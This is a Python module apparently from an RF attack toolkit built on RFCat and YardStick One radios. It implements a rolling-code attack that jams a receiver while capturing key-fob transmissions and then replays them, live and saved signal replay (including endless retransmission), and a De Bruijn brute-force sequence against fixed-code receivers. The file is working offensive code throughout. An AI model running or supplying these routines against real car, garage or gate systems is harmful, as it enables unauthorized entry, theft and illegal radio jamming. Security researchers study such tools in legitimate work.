
from . import RFFunctions as tools
from . import findDevices, jam, utilities
import time, sys
sys.dont_write_bytecode = True
#-----------------Rolling Code-------------------------#
def rollingCode(d, rf_settings, rolling_code, jamming_variance,):
    '''Sets up for a rolling code attack, requires a frequency
    and a RFCat Object'''

    print("ROLLING CODE REQUIRES 2 YardSticks Plugged In")
    j = jam.setupJammer(1, rf_settings)

    jam.jamming(j, "start", rf_settings, rolling_code, jamming_variance)
    roll_captures, signal_strength = tools.capturePayload(d, rolling_code, rf_settings)
    print("Waiting to capture your rolling code transmission")
    print(signal_strength)
    print(roll_captures)

    payloads = tools.createBytesFromPayloads(roll_captures)

    time.sleep(1)
    jam.jamming(j, "stop", rf_settings, rolling_code, jamming_variance)

    print("Sending First Payload ")
    tools.sendTransmission(payloads[0] ,d)
    response = input( "Ready to send second Payload?? (y/n) ")
    if response.lower() == "y":
        tools.sendTransmission(payloads[1] ,d)

    else:
        d.setModeIDLE()
        response = input( "Choose a name to save your file as and press enter: ")
        with open("./captures/"+response+".cap", 'w') as file:
            file.write(roll_captures[1])
        print(f"Saved file as: ./captures/{response}.cap  You can manually replay this later with -s -u")
#------------------End Roll Code-------------------------#


#---------------Replay Live Capture----------------------#
def replayLiveCapture(d, rolling_code, rf_settings):
    '''Replays a live capture real time, lets you select your capture
    and replay it or save it for later'''

    replay_capture, signal_strength = tools.capturePayload(d,rolling_code, rf_settings)
    replay_capture = [replay_capture]

    response = input( "Replay this capture? (y/n) ")
    if response.lower() == 'y':
        payloads = tools.createBytesFromPayloads(replay_capture)
        for payload in payloads:
            print("WAITING TO SEND")
            time.sleep(1)
            tools.sendTransmission(payload ,d)
            d.setModeIDLE()
            
    response = input( "Save this capture for later? (y/n) ")
    if response.lower() == 'y':
        mytime = time.strftime('%b%d_%X')
        with open("./captures/"+mytime+"_payload.cap", 'w') as file:
            file.write(replay_capture[0])
        print(f"Saved file as: ./captures/{mytime}_payload.cap")
#---------------End Replay Live Capture-------------------#


#---------------Replay Saved Capture----------------------#
def replaySavedCapture(d, uploaded_payload):
    '''Used to import an old capture and replay it from a file'''
    with open(uploaded_payload) as f:
        payloads = f.readlines()
        print(payloads)
        payloads = tools.createBytesFromPayloads(payloads)

        response = input( "Send once, or forever? (o/f) Default = o ")

        if response.lower() == "f":
            print("\nNOTE: TO STOP hit ENTER\n")
            while not keystop():
                for payload in payloads:
                    print("WAITING TO SEND")
                    time.sleep(1)          #You may not want this if you need rapid fire tx
                    tools.sendTransmission(payload ,d)
            d.setModeIDLE()

        else:
            for payload in payloads:
                    print("WAITING TO SEND")
                    time.sleep(1)
                    tools.sendTransmission(payload ,d)
                    d.setModeIDLE()
#--------------- End Replay Saved Capture-------------------#


#---------------Send DeBruijn Sequence Attack----------------------#
# https://en.wikipedia.org/wiki/De_Bruijn_sequence
def deBruijn(d):
    '''Send Binary deBruijn payload to bruteforce a signal'''
    response = input( "What length deBruijn would you like to try: ")

    binary = utilities.deBruijn(2, int(response))
    payload = tools.turnToBytes(binary)
    print(f"Sending {str(len(binary))} bits length binary deBruijn payload formated to bytes")

    tools.sendTransmission(payload ,d)
    d.setModeIDLE()
#----------------- End DeBruijn Sequence Attack--------------------#
